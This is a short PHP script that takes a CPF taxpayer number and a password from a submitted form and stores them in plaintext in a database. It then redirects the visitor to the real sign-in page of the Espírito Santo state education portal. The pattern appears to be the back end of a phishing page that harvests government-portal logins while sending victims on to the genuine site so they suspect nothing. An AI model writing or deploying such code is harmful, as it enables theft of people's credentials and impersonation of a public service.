<?php

if (isset($_POST['submit'])) {
    $cpf = $_POST['cpf'];
    $senha = $_POST['senha'];
    require_once 'db_connection.php';
    $stmt = $conn->prepare("INSERT INTO users (cpf, senha) VALUES (?, ?)");
    $stmt->bind_param("ss", $cpf, $senha);
    if($stmt->execute()){
        header("Location: https://seges.sedu.es.gov.br/users/sign_in");    
    }else{
        header("Location: index.php");    
    }
}else{
    header("Location: index.php");
}

?>